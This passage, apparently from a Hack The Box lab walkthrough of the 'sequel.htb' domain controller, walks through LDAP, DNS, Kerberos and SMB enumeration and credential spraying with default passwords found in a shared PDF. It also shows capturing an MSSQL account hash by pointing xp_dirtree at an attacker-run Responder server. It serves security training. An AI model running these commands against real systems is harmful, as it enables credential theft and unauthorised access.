</span></span><span style="display:flex;"><span>1433/tcp  open  ms-sql-s      Microsoft SQL Server <span style="color:#ae81ff">2019</span> 15.00.2000.00; RTM
</span></span><span style="display:flex;"><span>| ms-sql-ntlm-info:
</span></span><span style="display:flex;"><span>|   10.129.228.253:1433:
</span></span><span style="display:flex;"><span>|     Target_Name: sequel
</span></span><span style="display:flex;"><span>|     NetBIOS_Domain_Name: sequel
</span></span><span style="display:flex;"><span>|     NetBIOS_Computer_Name: DC
</span></span><span style="display:flex;"><span>|     DNS_Domain_Name: sequel.htb
</span></span><span style="display:flex;"><span>|     DNS_Computer_Name: dc.sequel.htb
</span></span><span style="display:flex;"><span>|     DNS_Tree_Name: sequel.htb
</span></span><span style="display:flex;"><span>|_    Product_Version: 10.0.17763
</span></span><span style="display:flex;"><span>| ms-sql-info:
</span></span><span style="display:flex;"><span>|   10.129.228.253:1433:
</span></span><span style="display:flex;"><span>|     Version:
</span></span><span style="display:flex;"><span>|       name: Microsoft SQL Server <span style="color:#ae81ff">2019</span> RTM
</span></span><span style="display:flex;"><span>|       number: 15.00.2000.00
</span></span><span style="display:flex;"><span>|       Product: Microsoft SQL Server <span style="color:#ae81ff">2019</span>
</span></span><span style="display:flex;"><span>|       Service pack level: RTM
</span></span><span style="display:flex;"><span>|       Post-SP patches applied: false
</span></span><span style="display:flex;"><span>|_    TCP port: <span style="color:#ae81ff">1433</span>
</span></span><span style="display:flex;"><span>|_ssl-date: 2024-10-04T15:25:48+00:00; +8h00m00s from scanner time.
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>SSL_Self_Signed_Fallback
</span></span><span style="display:flex;"><span>| Not valid before: 2024-10-04T15:17:39
</span></span><span style="display:flex;"><span>|_Not valid after:  2054-10-04T15:17:39
</span></span><span style="display:flex;"><span>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: sequel.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssl-cert: Subject:
</span></span><span style="display:flex;"><span>| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
</span></span><span style="display:flex;"><span>| Not valid before: 2024-01-18T23:03:57
</span></span><span style="display:flex;"><span>|_Not valid after:  2074-01-05T23:03:57
</span></span><span style="display:flex;"><span>|_ssl-date: 2024-10-04T15:25:48+00:00; +8h00m00s from scanner time.
</span></span><span style="display:flex;"><span>3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: sequel.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssl-cert: Subject:
</span></span><span style="display:flex;"><span>| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
</span></span><span style="display:flex;"><span>| Not valid before: 2024-01-18T23:03:57
</span></span><span style="display:flex;"><span>|_Not valid after:  2074-01-05T23:03:57
</span></span><span style="display:flex;"><span>|_ssl-date: 2024-10-04T15:25:48+00:00; +8h00m00s from scanner time.
</span></span><span style="display:flex;"><span>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span style="display:flex;"><span>|_http-title: Not Found
</span></span><span style="display:flex;"><span>9389/tcp  open  mc-nmf        .NET Message Framing
</span></span><span style="display:flex;"><span>49669/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span style="display:flex;"><span>49694/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49712/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49722/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49743/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
</span></span><span style="display:flex;"><span>Device type: general purpose
</span></span><span style="display:flex;"><span>Running <span style="color:#f92672">(</span>JUST GUESSING<span style="color:#f92672">)</span>: Microsoft Windows <span style="color:#ae81ff">2019</span> <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Aggressive OS guesses: Microsoft Windows Server <span style="color:#ae81ff">2019</span> <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Host script results:
</span></span><span style="display:flex;"><span>|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m59s
</span></span><span style="display:flex;"><span>| smb2-security-mode:
</span></span><span style="display:flex;"><span>|   3:1:1:
</span></span><span style="display:flex;"><span>|_    Message signing enabled and required
</span></span><span style="display:flex;"><span>| smb2-time:
</span></span><span style="display:flex;"><span>|   date: 2024-10-04T15:25:11
</span></span><span style="display:flex;"><span>|_  start_date: N/A
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 242.11 seconds</span></span></code></pre></div>
    
</div>
</li>
</ul>
<h3 id="ldap-389">LDAP <code>389</code>:</h3>
<ul>
<li>
<p><strong>Using LDAP anonymous bind to enumerate further</strong>:</p>
<ul>
<li>If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.
<ul>
<li>We can actually retrieve a significant amount of information via anonymous bind such as:
<ul>
<li>A list of all users</li>
<li>A list of all groups</li>
<li>A list of all computers.</li>
<li>User account attributes.</li>
<li>The domain password policy.</li>
<li>Enumerate users who are susceptible to AS-REPRoasting.</li>
<li>Passwords stored in the description fields</li>
</ul>
</li>
<li>The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates.</li>
</ul>
</li>
</ul>
</li>
<li>
<p>I actually have a handy script to check if anonymous bind is enabled &amp; if it is to dump a large amount of information. You can find it here</p>
<ul>
<li><a href="https://github.com/bloodstiller/ldapchecker">https://github.com/bloodstiller/ldapchecker</a></li>
</ul>
</li>
<li>
<p>It turns out the anonymous bind is enabled and we get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.</p>
<ol>
<li>
<p><!-- raw HTML omitted -->We have the naming context of the domain<!-- raw HTML omitted -->:</p>







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="kali%20in%20~/Desktop/WindowsTools%20%ef%90%8d%20v3.12.6%20%202GiB/7GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%0a%ef%95%99%2008:22:05%20zsh%20%e2%9d%af%20python3%20ldapchecker.py%20$box%0aAttempting%20to%20connect%20to%2010.129.228.253%20with%20SSL...%0aConnected%20successfully.%20Retrieving%20server%20information...%0aDSA%20info%20%28from%20DSE%29:%0a%20%20Supported%20LDAP%20versions:%203,%202%0a%20%20Naming%20contexts:%0a%20%20%20%20DC=sequel,DC=htb%0a%20%20%20%20CN=Configuration,DC=sequel,DC=htb%0a%20%20%20%20CN=Schema,CN=Configuration,DC=sequel,DC=htb%0a%20%20%20%20DC=DomainDnsZones,DC=sequel,DC=htb%0a%20%20%20%20DC=ForestDnsZones,DC=sequel,DC=htb">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>kali in ~/Desktop/WindowsTools  v3.12.6  2GiB/7GiB | 0B/1GiB with /usr/bin/zsh
</span></span><span style="display:flex;"><span> 08:22:05 zsh ❯ python3 ldapchecker.py $box
</span></span><span style="display:flex;"><span>Attempting to connect to 10.129.228.253 with SSL...
</span></span><span style="display:flex;"><span>Connected successfully. Retrieving server information...
</span></span><span style="display:flex;"><span>DSA info <span style="color:#f92672">(</span>from DSE<span style="color:#f92672">)</span>:
</span></span><span style="display:flex;"><span>  Supported LDAP versions: 3, <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>  Naming contexts:
</span></span><span style="display:flex;"><span>    DC<span style="color:#f92672">=</span>sequel,DC<span style="color:#f92672">=</span>htb
</span></span><span style="display:flex;"><span>    CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>sequel,DC<span style="color:#f92672">=</span>htb
</span></span><span style="display:flex;"><span>    CN<span style="color:#f92672">=</span>Schema,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>sequel,DC<span style="color:#f92672">=</span>htb
</span></span><span style="display:flex;"><span>    DC<span style="color:#f92672">=</span>DomainDnsZones,DC<span style="color:#f92672">=</span>sequel,DC<span style="color:#f92672">=</span>htb
</span></span><span style="display:flex;"><span>    DC<span style="color:#f92672">=</span>ForestDnsZones,DC<span style="color:#f92672">=</span>sequel,DC<span style="color:#f92672">=</span>htb</span></span></code></pre></div>
    
</div>
</li>
<li>
<p><!-- raw HTML omitted -->We have the domain functionaility level<!-- raw HTML omitted -->:</p>







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="#ZgotmplZ">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Other:
</span></span><span style="display:flex;"><span>  domainFunctionality:
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">7</span>
</span></span><span style="display:flex;"><span>  forestFunctionality:
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">7</span>
</span></span><span style="display:flex;"><span>  domainControllerFunctionality:
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">7</span>
</span></span><span style="display:flex;"><span>  rootDomainNamingContext:
</span></span><span style="display:flex;"><span>    DC<span style="color:#f92672">=</span>sequel,DC<span style="color:#f92672">=</span>htb
</span></span><span style="display:flex;"><span>  ldapServiceName:
</span></span><span style="display:flex;"><span>    sequel.htb:dc$@SEQUEL.HTB</span></span></code></pre></div>
    
</div>
<ul>
<li>The functionality level determines the minimum version of Windows server that can be used for a DC.
<ul>
<li>
<p>+Note+: That any host os can used on <strong>workstations</strong>, however the functionality level determines what the minimum version for DC&rsquo;s and the forest.</p>
</li>
<li>
<p><a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels">https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels</a></p>
</li>
<li>
<p>Knowing the function level is useful as if want to target the DC&rsquo;s and servers, we can know by looking at the function level what the minimum level of OS would be.</p>
</li>
<li>
<p>In this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.</p>
</li>
<li>
<p>Here’s a list of functional level numbers and their corresponding Windows Server operating systems:</p>
<table>
  <thead>
      <tr>
          <th style="text-align: left">Functional Level Number</th>
          <th style="text-align: left">Corresponding OS</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: left">0</td>
          <td style="text-align: left">Windows 2000</td>
      </tr>
      <tr>
          <td style="text-align: left">1</td>
          <td style="text-align: left">Windows Server 2003 Interim</td>
      </tr>
      <tr>
          <td style="text-align: left">2</td>
          <td style="text-align: left">Windows Server 2003</td>
      </tr>
      <tr>
          <td style="text-align: left">3</td>
          <td style="text-align: left">Windows Server 2008</td>
      </tr>
      <tr>
          <td style="text-align: left">4</td>
          <td style="text-align: left">Windows Server 2008 R2</td>
      </tr>
      <tr>
          <td style="text-align: left">5</td>
          <td style="text-align: left">Windows Server 2012</td>
      </tr>
      <tr>
          <td style="text-align: left">6</td>
          <td style="text-align: left">Windows Server 2012 R2</td>
      </tr>
      <tr>
          <td style="text-align: left">7</td>
          <td style="text-align: left">Windows Server 2016</td>
      </tr>
      <tr>
          <td style="text-align: left">8</td>
          <td style="text-align: left">Windows Server 2019</td>
      </tr>
      <tr>
          <td style="text-align: left">9</td>
          <td style="text-align: left">Windows Server 2022</td>
      </tr>
  </tbody>
</table>
<ul>
<li>+Note+:
<ul>
<li>Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest.</li>
<li>As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers.</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p><!-- raw HTML omitted -->We have the full server name<!-- raw HTML omitted -->:</p>
<ul>
<li>Again we can see this has the CN as the base (mentioned previously.) So it appears it&rsquo;s a printer server site of some sort. What is also interesting is the CN name &ldquo;Configuration&rdquo;, this could imply that it is still to be configured. Which is interesting as things that are still being configured may not have had thorough security standards actioned.







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="#ZgotmplZ">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span> serverName:
</span></span><span style="display:flex;"><span>    CN<span style="color:#f92672">=</span>DC,CN<span style="color:#f92672">=</span>Servers,CN<span style="color:#f92672">=</span>Default-First-Site-Name,CN<span style="color:#f92672">=</span>Sites,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>sequel,DC<span style="color:#f92672">=</span>htb</span></span></code></pre></div>
    
</div>
</li>
</ul>
</li>
</ol>
</li>
<li>
<p>It&rsquo;s pretty amazing already what we have learned just by running some fairly simple ldap queries.</p>
<ul>
<li>We have the naming context.</li>
<li>Domain name.</li>
</ul>
</li>
<li>
<p><strong>I update my <code>/etc/hosts</code> file now that we have the server name</strong>.</p>
<ul>
<li>This is so we can use tools like <a href="https://github.com/ropnop/kerbrute">kerbrute</a> for user enumeration as well as other tools later on.</li>
</ul>
</li>
</ul>
<h3 id="dns-53">DNS <code>53</code>:</h3>
<h4 id="using-dnsenum-to-enumerate-dns-records">Using <a href="https://www.kali.org/tools/dnsenum/">dnsenum</a> to enumerate DNS records:</h4>
<ul>
<li>Run <a href="https://www.kali.org/tools/dnsenum/">dnsenum</a> to enumerate if there are any interesting records present:
<ul>
<li><code>dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Seclists/Discovery/DNS/subdomains-top1million-110000.txt sequel.htb</code>
<ul>
<li><figure><img src="/ox-hugo/2024-10-04-084509_.png">
</figure>

<ul>
<li>Nothing of note other than the standard DNS records for a DC.</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="kerberos-88">Kerberos <code>88</code>:</h3>
<h4 id="using-kerbrute-to-bruteforce-usernames">Using <a href="https://github.com/ropnop/kerbrute">Kerbrute</a> to bruteforce Usernames:</h4>
<ul>
<li>As kerberos is present we can enumerate users using <a href="https://github.com/ropnop/kerbrute">kerbrute</a>:
<ul>
<li><code>kerbrute userenum -d sequel.htb --dc $box ~/Wordlists/statistically-likely-usernames/jsmith.txt</code></li>
<li><figure><img src="/ox-hugo/2024-10-04-084056_.png">
</figure>
</li>
<li>Unfortunately we get no hits:</li>
</ul>
</li>
</ul>
<h3 id="smb-445">SMB <code>445</code>:</h3>
<h4 id="using-netexec-to-check-for-null-and-guest-session-on-smb">Using <a href="https://www.kali.org/tools/netexec/">netexec</a> to check for null &amp; guest session on SMB:</h4>
<ul>
<li>
<p><strong>I check for a null sesion using netexec but they have been disabled</strong>:</p>
<ul>
<li><code>netexec smb $box -u '' -p '' --shares</code></li>
<li><figure><img src="/ox-hugo/2024-10-04-084303_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>I check if the guest account has been disabled</strong>:</p>
<ul>
<li><code>netexec smb $box -u 'guest' -p '' --shares</code></li>
<li><figure><img src="/ox-hugo/2024-10-04-084640_.png">
</figure>
</li>
<li>It looks like we can access the <code>Public</code> &amp; <code>IPC$</code> We will focus on the <code>Public</code> share.</li>
</ul>
</li>
</ul>
<h5 id="over-view-of-ipc-share">Over view of <code>IPC$</code> Share:</h5>
<ul>
<li><strong>Quick overview if you are unfamiliar with the <code>IPC$</code> share</strong>:
<ul>
<li>The <code>IPC$</code> share (<code>Inter-Process Communication</code>) is a special administrative share in Windows which allows communication with programs via Named Pipes:
<ul>
<li>It&rsquo;s mainly used for inter-process communication between hosts over a network.</li>
<li>It also enables remote administration of a system, allowing file and print sharing.</li>
<li>It&rsquo;s a default share on windows systems.</li>
<li>Requires credentials for access, typically used in conjunction with administrative or user rights.
<ul>
<li>But as you can see <code>Guest</code> creds can also work in some instances.</li>
</ul>
</li>
<li>It is possible to use <code>IPC$</code> for enumeration (e.g., enumerating users, shares, groups or services).</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="connecting-to-the-public-smb-share-using-smbclient">Connecting to the Public <code>SMB</code> Share using <code>smbclient</code>:</h4>
<ul>
<li>
<p><strong>I logon to the share using a guest session</strong>:</p>
<ul>
<li><code>smbclient -U 'guest'  &quot;\\\\$box\\Public&quot;</code>
<ul>
<li>I see they have a <code>.pdf</code> called <code>SQL Server Procedures</code> in the share
<ul>
<li><figure><img src="/ox-hugo/2024-10-04-090146_.png">
</figure>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>I download the</strong> <code>.pdf</code>:</p>
<ul>
<li><code>Get &quot;SQL Server Procedures.pdf&quot;</code></li>
<li><figure><img src="/ox-hugo/2024-10-04-090343_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h4 id="attempting-to-extract-creator-names-from-the-dot-pdf">Attempting to extract creator names from the <code>.PDF</code>:</h4>
<p>If you are not aware, it is sometimes possible to extract valid domain usernames from <code>pdf's</code> if they have been created on a Windows host. As often the Creator Field is populated using the Windows User&rsquo;s Logged-In Name</p>
<ul>
<li><strong>Some reasons why the Creator Field Uses the Windows User&rsquo;s Logged-In Name</strong>:
<ul>
<li>
<p><strong>PDF Metadata Collection</strong>:</p>
<ul>
<li>When creating a PDF, many programs (e.g., Microsoft Word, Adobe Acrobat) automatically pull metadata from the system.</li>
</ul>
</li>
<li>
<p><strong>System Environment Variables</strong>:</p>
<ul>
<li>The logged-in Windows username is part of system environment variables. This is often used to populate fields like &ldquo;<code>Creator</code>&rdquo; in the PDF document.</li>
</ul>
</li>
<li>
<p><strong>Program Defaults</strong>:</p>
<ul>
<li>By default, many PDF generation tools use the logged-in username as the creator unless manually changed by the user.</li>
</ul>
</li>
<li>
<p><strong>Tracking Ownership</strong>:</p>
<ul>
<li>This feature helps track the original creator or author of a document for auditing or document management purposes.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h5 id="attempting-to-extract-usernames-from-the-pdf-using-exiftool">Attempting to extract Usernames From the PDF using exiftool:</h5>
<ul>
<li><code>exiftool -Creator -csv *pdf | cut -d, -f2 | sort | uniq &gt; userNames.txt</code></li>
<li>I run it and check the output of the file, however there are no valid usernames, just that it was crated using Mozilla.</li>
<li><figure><img src="/ox-hugo/2024-10-04-091217_.png">
</figure>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p>Command Breakdown:</p>
<ol>
<li>
<p><code>exiftool -Creator -csv *pdf</code></p>
<ul>
<li><code>exiftool</code>: Run the tool</li>
<li><code>-Creator</code>: Extracts the <code>Creator</code> metadata field from the files.</li>
<li><code>-csv</code>: Outputs the data in CSV format.
<ul>
<li>This is the most important part for the rest of the command to work:
<ul>
<li>The <code>CSV</code> format provides a structured way to output the metadata in rows and columns. When extracting metadata from multiple PDFs, each PDF&rsquo;s metadata is presented as a row, and each field (like &ldquo;<code>Creator</code>&rdquo;) is a column. This makes it easier to process the data programmatically.</li>
<li><strong>Simplicity</strong>: When using tools like <code>cut</code>, it’s easier to extract specific fields by referring to column numbers (e.g., <code>-f2</code> for the second column), which is straightforward with <code>CSV</code> formatting.</li>
</ul>
</li>
</ul>
</li>
<li><code>*pdf</code>: Targets all PDF files in the current directory.</li>
</ul>
</li>
<li>
<p><code>| cut -d, -f2</code></p>
<ul>
<li><code>|</code>: Pipes the output from the previous command into the next.</li>
<li><code>cut</code>: Extracts specific fields from the CSV output.</li>
<li><code>-d,</code>: Uses a comma as the delimiter (since it&rsquo;s CSV data).</li>
<li><code>-f2</code>: Selects the second field, which contains the creator name.</li>
</ul>
</li>
<li>
<p><code>| sort</code>: Sorts the creator names alphabetically.</p>
</li>
<li>
<p><code>| uniq</code>: Removes duplicate names, leaving only unique entries.</p>
</li>
<li>
<p><code>&gt; userNames.txt</code></p>
<ul>
<li>Redirects the final output (unique creator names) into a file named <code>userNames.txt</code></li>
</ul>
</li>
</ol>
</li>
</ul>
<h4 id="finding-hard-coded-mssql-creds-in-the-sql-server-procedures-pdf">Finding Hard-Coded mSSQL Creds in the <code>SQL Server Procedures</code> PDF:</h4>
<ul>
<li>
<p><strong>Problematic MSSQL Instance</strong>:</p>
<ul>
<li>Reading the PDF it details how the company has had issues with mistakes with the MSSQL instance. However it appears there is still a live server running on the DC (which we have seen from our <code>NMAP</code> scan)
<ul>
<li><figure><img src="/ox-hugo/2024-10-04-091649_.png">
</figure>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Hard Coded Creds</strong>:</p>
<ul>
<li>Looking on the second page we can see they hard creds for new hires and have placed these in the <code>.pdf</code> naughty, naughty!</li>
<li><figure><img src="/ox-hugo/2024-10-04-091505_.png">
</figure>
</li>
<li>We will use these to connect</li>
</ul>
</li>
</ul>
<h4 id="finding-usernames-within-the-pdf">Finding Usernames within the PDF:</h4>
<ul>
<li><strong>Finding Usernames</strong>:
<ul>
<li>Looking through the file we can see that the users, <code>Ryan</code>, <code>Tom</code> &amp; <code>Brandon</code>.
There is also a mail to hyperlink to Brandon that reveals his username to be <code>Brandon.brown@sequel.htb</code> I will add these to my username list.</li>
</ul>
</li>
</ul>
<h4 id="cred-stuffing-and-meaning-of-guest-in-the-smb-responses-in-netexec">Cred Stuffing &amp; Meaning of &ldquo;<code>Guest</code>&rdquo; in the <code>SMB</code> Responses in <code>netexec</code>:</h4>
<ul>
<li>I tried cred stuffing all of the users &amp; the password I have found so far and got the below output, where <code>(Guest)</code> was appended to each attempt.
<ul>
<li><figure><img src="/ox-hugo/2024-10-04-092745_.png">
</figure>
</li>
<li>I had never seen this before &amp; it led me to this page:
<ul>
<li>
<p><a href="https://www.netexec.wiki/smb-protocol/enumeration/enumerate-guest-logon">https://www.netexec.wiki/smb-protocol/enumeration/enumerate-guest-logon</a></p>
</li>
<li>
<p>Which says this:</p>
<blockquote>
<p>Using a random username and password you can check if the target accepts guest logon. If so, it means that either the domain guest account or the local guest account of the server you&rsquo;re targetting is enabled.</p>
</blockquote>
</li>
</ul>
</li>
</ul>
</li>
<li><strong>Guest account in</strong> <code>SMB</code>:
<ul>
<li><code>SMB</code> servers often allow users to connect as a <code>Guest</code>, meaning the users have limited or no write permissions. The server may allow these users to read files but restrict their ability to modify or create new files.</li>
<li>In this case <code>sequel.htb\ryan:GuestUserCantWrite1 (Guest)</code> indicates that the <code>ryan</code> account is authenticated, but with Guest permissions, likely meaning the account does not have full access to resources.</li>
<li>So when you see &ldquo;<code>Guest</code>&rdquo; listed after users like <code>sequel.htb\ryan</code>, <code>sequel.htb\tom</code>, etc., it indicates that the user account is being authenticated using the Guest account privileges in SMB.</li>
</ul>
</li>
</ul>
<h3 id="mssql-1433">MSSQL <code>1433</code>:</h3>
<ul>
<li>I store each useful bit of information in <code>VARS</code> so I can easily call on them later and have to type way less:
<ul>
<li><figure><img src="/ox-hugo/2024-10-04-093531_.png">
</figure>
</li>
<li>This is also a great way to ensure you make less mistakes &amp; type-os.</li>
</ul>
</li>
</ul>
<h4 id="cred-stuffing-the-mssql-instance">Cred stuffing the MSSQL Instance:</h4>
<ul>
<li>I cred stuff with all the known users so far just incase they have not changed their password from the default password, however it appears they have.</li>
<li><figure><img src="/ox-hugo/2024-10-04-111518_.png">
</figure>
</li>
</ul>
<h2 id="2-dot-foothold">2. Foothold:</h2>
<h3 id="connecting-to-the-mssql-instance-using-impacket-mssqlclient">Connecting to the MSSQL Instance using impacket-mssqlclient:</h3>
<ul>
<li><strong>Connecting to the mssql instance</strong>:
<ul>
<li><code>impacket-mssqlclient $domain/$user:$pass@$box</code></li>
<li><figure><img src="/ox-hugo/2024-10-04-093702_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h3 id="enumerating-the-mssql-instance">Enumerating the MSSQL Instance:</h3>
<ul>
<li>Looking through the mssql instance there are only default databases.</li>
<li>I try and activate <code>xp_cmdshell</code> however we do not have perms:
<ul>
<li><figure><img src="/ox-hugo/2024-10-04-113407_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h3 id="capturing-the-mssql-system-admin-hash-using-responder-and-xp-dirtree">Capturing the MSSQL System Admin hash using <a href="https://www.kali.org/tools/responder/">Responder</a> &amp; <code>xp_dirtree</code>:</h3>
<ul>
<li>
<p>I know that it&rsquo;s possible to read files using <code>xp_dirtree</code> as I did this on the Manager box:</p>
<ul>
<li><a href="https://bloodstiller.com/walkthroughs/manager-box/">https://bloodstiller.com/walkthroughs/manager-box/</a></li>
</ul>
</li>
<li>
<p><strong>I check if I can use <code>xp_dirtree</code> to read &amp; list local files</strong></p>
<ul>
<li><figure><img src="/ox-hugo/2024-10-04-114913_.png">
</figure>
</li>
<li>I cannot read files however my password is <code>GuestUserCantWrite1</code> so lets see if we can write as I know it&rsquo;s possible to host a malicious SMB server and request the DB instance attempt to connect so we can capture the <code>MSSQL System Administrator Hash</code>
<ul>
<li>Just a note: impacket-mssqlclient.py has good tools built in already so you you can just run <code>xp_dirtee &lt;path&gt;</code> you do not have to use all args etc.
<ul>
<li><figure><img src="/ox-hugo/2024-10-04-125702_.png">
</figure>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<!-- raw HTML omitted -->
<ol>
<li>
<p><strong>I start</strong> <a href="https://www.kali.org/tools/responder/">Responder</a>:</p>
<ul>
<li><code>sudo responder -v -I tun0</code></li>
</ul>
</li>
<li>
<p><strong>I use</strong> <code>xp_dirtee</code> <strong>to connect back to my malicious SMB server</strong>:</p>
<ul>
<li><code>exec master..xp_dirtree '\\10.10.14.38\share\'</code>
<ul>
<li>This is just \\&lt;MYKALIIP\FAKESHARE&gt;</li>
<li><figure><img src="/ox-hugo/2024-10-04-115426_.png">
</figure>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Hash Caught</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-10-04-115545_.png">
</figure>
</li>
<li>This works as when we run the command using <code>xp_dirtree</code> it tries to connect &amp; authorize to our malicious <code>SMB server</code> &amp; <a href="https://www.kali.org/tools/responder/">Responder</a> captures the hash:</li>
</ul>
</li>
</ol>
<h4 id="overview-of-xp-dirtree">Overview of <code>xp_dirtree</code>:</h4>
<ul>
<li>
<p><code>xp_dirtree</code> is an extended stored procedure in Microsoft SQL Server.</p>
</li>
<li>
<p>It is used to list the directory structure (files and subdirectories) of a specified path on the server.</p>
</li>
<li>
<p>Command Injection Risk: Since it&rsquo;s interacting with the OS, it can be a target for malicious input if not properly handled. (E.G. Getting it to connect to our malicious SMB server so we can capture hashes)</p>
</li>
<li>
<p><strong>Using</strong> <code>xp_dirtree</code>:</p>
</li>
<li>
<p>Called using the syntax below:</p>
<ul>
<li><code>EXEC xp_dirtree 'path', depth, file_flag;</code></li>
<li><strong>Example</strong>: <code>EXEC xp_dirtree 'C:\inetpub\wwwroot', 1, 1;</code></li>
<li><strong>Example</strong>: <code>EXEC xp_dirtree 'C:\', 1, 1;</code>
<ul>
<li><strong>Notes</strong>:
<ul>
<li><strong>Path Specified</strong>:
<ul>
<li><code>C:\</code> Lists the contents of the root of the C drive.</li>
</ul>
</li>
<li><strong>Depth Level</strong>:
<ul>
<li><code>1</code>: Indicates it will list files and directories in the first level of the C drive.</li>
<li>This includes files directly in <code>C:\</code> and the first-level directories under <code>C:\</code>.</li>
</ul>
</li>
<li><strong>File Flag</strong>:
<ul>
<li><code>1</code>: Specifies that both files and directories should be included in the output.</li>
</ul>
</li>
<li><strong>Output</strong>:
<ul>
<li><!-- raw HTML omitted -->The result set will contain<!-- raw HTML omitted -->:
<ul>
<li>All files located directly in <code>C:\</code>.</li>
<li>All first-level subdirectories (e.g., <code>C:\Program Files</code>, <code>C:\Windows</code>, etc.).</li>
</ul>
</li>
</ul>
</li>
<li>+Note+:
<ul>
<li>The command does <strong>not</strong> recursively list files in subdirectories beyond the first level due to the specified depth of 1~.</li>
<li>If you want to see files in deeper levels, you can increase the depth parameter e.g. <code>2</code>, <code>3</code> etc</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="cracking-the-mssql-system-admin-using-hashcat">Cracking the MSSQL System Admin using <a href="https://www.kali.org/tools/hashcat/">Hashcat</a>:</h3>
<ul>
<li>
